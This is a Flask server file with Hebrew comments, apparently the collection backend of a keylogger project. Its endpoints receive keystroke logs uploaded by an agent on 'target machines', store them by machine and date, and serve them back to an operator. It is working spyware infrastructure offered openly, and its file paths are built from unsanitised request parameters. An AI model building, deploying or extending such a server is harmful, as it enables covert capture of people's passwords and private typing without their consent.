from flask import Flask, request, jsonify
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from keylogger_agent.encryption import Encryptor
from keylogger_agent.config import Config
from datetime import datetime
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# הגדרת תיקייה מרכזית לנתונים
DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
if not os.path.exists(DATA_FOLDER):
    os.makedirs(DATA_FOLDER)


# פונקציה ליצירת שם קובץ לפי חותמת זמן
# def generate_log_filename():
#     return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"


@app.route('/')
def home():
    return "KeyLogger Server is Running"


# ✅ שלב 3: API לקבלת נתונים מהסוכן ושמירה לקובץ
@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = data["data"]

    # יצירת תיקייה עבור מכונה אם לא קיימת
    date_str = datetime.now().strftime("%Y-%m-%d")
    machine_folder = os.path.join(DATA_FOLDER, machine)
    os.makedirs(machine_folder, exist_ok=True)

    file_path = os.path.join(machine_folder, f"log_{date_str}.txt")
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(log_data + "\n")


    return jsonify({"status": "success", "file": file_path}), 200


# ✅ שלב 4: API להחזרת רשימת מכונות
@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    try:
        machines = [
            name for name in os.listdir(DATA_FOLDER)
            if os.path.isdir(os.path.join(DATA_FOLDER, name))
        ]
        return jsonify(machines), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    

@app.route('/api/get_dates', methods=['GET'])
def get_dates():
    machine = request.args.get("machine")
    if not machine:
        return jsonify({"error": "Missing 'machine' parameter"}), 400

    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    files = [f for f in os.listdir(machine_folder) if f.startswith("log_")]
    dates = [f.replace("log_", "").replace(".txt", "") for f in files]
    return jsonify(dates), 200



# ✅ שלב 5: API להחזרת נתוני הקשות של מכונה מסוימת

@app.route('/api/get_keystrokes', methods=['GET'])
def get_keystrokes():
    machine = request.args.get("machine")
    date = request.args.get("date")
    if not machine or not date:
        return jsonify({"error": "Missing parameters"}), 400

    file_path = os.path.join(DATA_FOLDER, machine, f"log_{date}.txt")
    if not os.path.exists(file_path):
        return jsonify({"machine": machine, "logs": []}), 200

    with open(file_path, "r", encoding="utf-8") as f:
        logs = [line.strip() for line in f if line.strip()]  # ללא פענוח

    return jsonify({
        "machine": machine,
        "date": date,
        "logs": logs
    }), 200



if __name__ == '__main__':
    app.run(debug=True)